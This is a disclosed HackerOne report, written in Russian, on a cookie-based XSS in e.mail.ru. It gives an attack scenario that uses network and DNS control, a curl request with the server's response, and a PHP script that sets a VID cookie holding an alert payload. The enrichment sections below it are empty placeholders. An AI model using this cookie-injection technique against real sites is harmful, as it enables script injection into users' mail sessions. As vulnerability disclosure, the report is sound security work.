---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '312548'
original_report_id: '312548'
title: XSS via Cookie in e.mail.ru
weakness: Cross-site Scripting (XSS) - DOM
team_handle: mailru
created_at: '2018-02-05T15:27:29.228Z'
disclosed_at: '2018-08-15T17:04:51.999Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
asset_identifier: e.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# XSS via Cookie in e.mail.ru

## Metadata

- HackerOne Report ID: 312548
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: mailru
- Disclosed At: 2018-08-15T17:04:51.999Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Привет! Нашел stored xss через куку VID. Обычно такое эксплуатируется через mitm.
Сама кука не имеет атрибутов secure и samesite, что дает возможность выставить ее по http на сервере атакующего.


Сценарий такой:
1. Жертва находится в сети атакующего
2. DNS сервер сети атакующего резолвит хост attacker.mail.ru на его сервер
3. Жертва идет на attacker.mail.ru (или атакующий ее автоматически редиректит на него)
4. Сервер attacker.mail.ru перезаписывает куку VID
5. Жертва получает stored xss на e.mail.ru


Скриншоты:

{F260393}
{F260394}



Поднял виртуальный хост, который вешает куку тут:

```
mihailob@kali:~/tmp$ curl -i 'http://52.34.103.214/' -H 'Host: attacker.mail.ru'
HTTP/1.1 200 OK
Server: nginx/1.13.8
Date: Mon, 05 Feb 2018 15:21:20 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.5.9-1ubuntu4.22
Set-Cookie: VID='+alert(123123123)+'; expires=Tue, 06-Feb-2018 01:21:20 GMT; Max-Age=36000; path=/; domain=.mail.ru; httponly
Access-Control-Allow-Origin: *


<html>
<head>

</head>
</html>
```



Листиг скрипта, который вешает куку:

```
cat index.php 
<?php

if ($_SERVER['HTTP_HOST'] == 'attacker.mail.ru') {
        setrawcookie("VID",'\'+alert(123123123)+\'', time()+36000, "/", ".mail.ru",0,1);
}

?>

<html>
<head>

</head>
</html>
```

## Impact

xss

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
